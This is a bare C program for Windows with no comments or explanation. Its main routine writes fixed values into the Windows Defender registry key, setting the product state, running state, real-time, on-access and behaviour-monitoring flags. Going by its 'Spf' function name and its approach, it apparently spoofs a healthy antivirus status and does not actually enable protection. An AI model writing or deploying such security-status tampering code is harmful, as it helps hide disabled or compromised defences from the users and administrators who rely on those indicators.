#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#pragma comment(lib,"advapi32.lib")

DWORD SetStat(DWORD val) {
	HKEY hk = NULL;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS)
		return 1;
	DWORD ps = val;
	RegSetValueExW(hk, L"ProductState", 0, REG_DWORD, (LPBYTE)&ps, sizeof(ps));
	RegCloseKey(hk);
	return 0;
}

DWORD SetRun(DWORD val) {
	HKEY hk = NULL;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS)
		return 1;
	RegSetValueExW(hk, L"ProductRunningState", 0, REG_DWORD, (LPBYTE)&val, sizeof(val));
	RegCloseKey(hk);
	return 0;
}

DWORD SetRtPr(DWORD val) {
	HKEY hk = NULL;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS)
		return 1;
	RegSetValueExW(hk, L"RealTimeProtectionEnabled", 0, REG_DWORD, (LPBYTE)&val, sizeof(val));
	RegCloseKey(hk);
	return 0;
}

DWORD SetOaP(DWORD val) {
	HKEY hk = NULL;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS)
		return 1;
	RegSetValueExW(hk, L"OnAccessProtectionEnabled", 0, REG_DWORD, (LPBYTE)&val, sizeof(val));
	RegCloseKey(hk);
	return 0;
}

DWORD SetBeh(DWORD val) {
	HKEY hk = NULL;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &hk) != ERROR_SUCCESS)
		return 1;
	RegSetValueExW(hk, L"BehaviorMonitorEnabled", 0, REG_DWORD, (LPBYTE)&val, sizeof(val));
	RegCloseKey(hk);
	return 0;
}

DWORD Spf() {
	SetStat(266256);
	SetRun(1);
	SetRtPr(1);
	SetOaP(1);
	SetBeh(1);
	return 0;
}

int main() {
	Spf();
	return 0;
}
